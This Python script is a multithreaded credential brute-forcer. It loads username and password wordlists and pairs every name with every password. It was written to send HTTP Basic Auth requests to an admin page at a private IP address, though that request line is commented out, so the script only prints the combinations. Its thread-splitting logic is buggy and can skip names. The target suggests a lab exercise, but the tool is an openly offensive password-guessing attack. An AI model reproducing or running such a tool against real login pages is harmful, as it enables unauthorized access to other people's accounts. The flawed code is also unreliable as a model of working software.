import threading, bruteforcing
import requests as req
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bt
import math

class mainClass:
    # Default value
    numOfthreads = 1
    name_list = []
    pass_list = []
    calculateSplitIndexNames =0

    # Constructor setting number of threads to use otherwise use default 1
    def __init__(self, numOfthreads):
        if numOfthreads > 5:
            self.numOfthreads = 5
        else:
            self.numOfthreads = numOfthreads
        self.prerequisite()


    def prerequisite(self):
        # Populate list of passwords
        with open('pass.txt', 'r') as myfile:
            for k in myfile.readlines():
                # print(j.strip('\n'))
                self.pass_list.append(k.strip('\n'))

        # Populate list of names
        with open('names.txt', 'r') as myfile1:
            for k1 in myfile1.readlines():
                # print(j.strip('\n'))
                self.name_list.append(k1.strip('\n'))

        if self.numOfthreads > 1:
            if (len(self.name_list) / self.numOfthreads) >= 1.5 :
                self.calculateSplitIndexNames = math.ceil(len(self.name_list) / self.numOfthreads)
            else:
                self.calculateSplitIndexNames = math.floor(len(self.name_list) / self.numOfthreads)
                #print(calculateSplitIndexNames)

    # The attack
    def bruteForce(self, indF,indL):
        for i in range(indF,indL):
            print()
            name = self.name_list[i]
            for j in self.pass_list:
                print(name,j)
                # resLog = req.get("http://172.16.120.120/admin.php", auth=HTTPBasicAuth(name, j))
                # # print(resLog.status_code)
                # if resLog.status_code == 200:
                #     print(i)
                #     print(j)
                #     break

    # The todo for threads
    def thread_function(self, indF,indL):
        #self.bruteForce(index)
        print(indF-1,indL+1)
        self.bruteForce(indF-1,indL)

    # Threads creation
    def createThreads(self):
        lsThreads = []
        #print(self.calculateSplitIndexNames)
        sum = 0
        lsToBeDist = []
        # for i in range(1,len(self.name_list)):
        lengthList = len(self.name_list)
        while lengthList >0:
            sum = sum + self.calculateSplitIndexNames
            lsToBeDist.append(sum)
            lengthList = lengthList - sum
        print(lsToBeDist)

        passed = ""
        for i in range(1,self.numOfthreads):
            #print(i , len(lsToBeDist))
            if i == len(lsToBeDist):
                    #print("@!",i)
                    passed = (lsToBeDist[i-1],len(self.name_list))
                    break
            else:
                    #print(i)
                    passed = (lsToBeDist[i-1], lsToBeDist[i])

            thrds = threading.Thread(target=self.thread_function, args=(passed[0],passed[1]))
            lsThreads.append(thrds)

        for j in lsThreads:
            j.start()


mainClass(5).createThreads()
